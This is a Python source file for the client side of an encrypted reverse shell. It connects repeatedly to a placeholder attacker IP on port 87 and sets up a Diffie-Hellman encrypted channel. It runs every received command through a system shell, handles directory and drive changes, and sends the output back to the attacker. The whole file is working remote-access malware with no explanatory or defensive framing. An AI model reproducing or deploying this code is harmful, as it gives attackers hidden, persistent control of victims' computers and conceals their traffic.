import socket
import subprocess
import time
import os
from KeyExchange import DiffieHellmanChannel, RSAChannel

attacker_ip = 'IP'
port = 87

while True:
    try:
        print("Trying to connect...")
        s = socket.socket()
        s.settimeout(3)
        s.connect((attacker_ip, port))
        s.settimeout(None)
        print("Connected to attacker.")
        secure = DiffieHellmanChannel()
        server_pub = int(s.recv(4096).decode())
        s.send(str(secure.public).encode())
        secure.generate_shared_key(server_pub)

        while True:
            try:
                validation = s.recv(1024).decode().strip()
                validation = secure.decrypt(validation)

                cwd = os.getcwd()
                s.send(secure.encrypt(cwd).encode())

                command = s.recv(1024).decode()
                decrypted = secure.decrypt(command)
                if decrypted.lower() == "exit":
                    print("[+] Exit command received. Closing connection.")
                    s.close()
                    break

                if decrypted.lower().startswith("cd "):
                    try:
                        path = decrypted[3:].strip()
                        os.chdir(path)
                        output = f"Changed directory to {os.getcwd()}".encode()
                    except Exception as e:
                        output = str(e).encode()

                elif len(decrypted.strip()) == 2 and decrypted[1] == ':' and decrypted[0].isalpha():
                    try:
                        os.chdir(decrypted.strip() + "\\")
                        output = f"Changed drive to {os.getcwd()}".encode()
                    except Exception as e:
                        output = str(e).encode()

                else:
                    try:
                        output = subprocess.check_output(decrypted, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    except Exception as e:
                        output = str(e).encode()

                chunk_size = 1024
                for i in range(0, len(output), chunk_size):
                    s.send(secure.encrypt(output[i:i + chunk_size]).encode())

                s.send(secure.encrypt(b"<EOF>\n").encode())

            except Exception as e:
                print(f"[-] Error during command execution: {e}")
                break

    except Exception as e:
        print(f"Connection failed: {e}")
        try:
            s.close()
        except:
            pass
        time.sleep(5)  # Retry after a 5-second delay
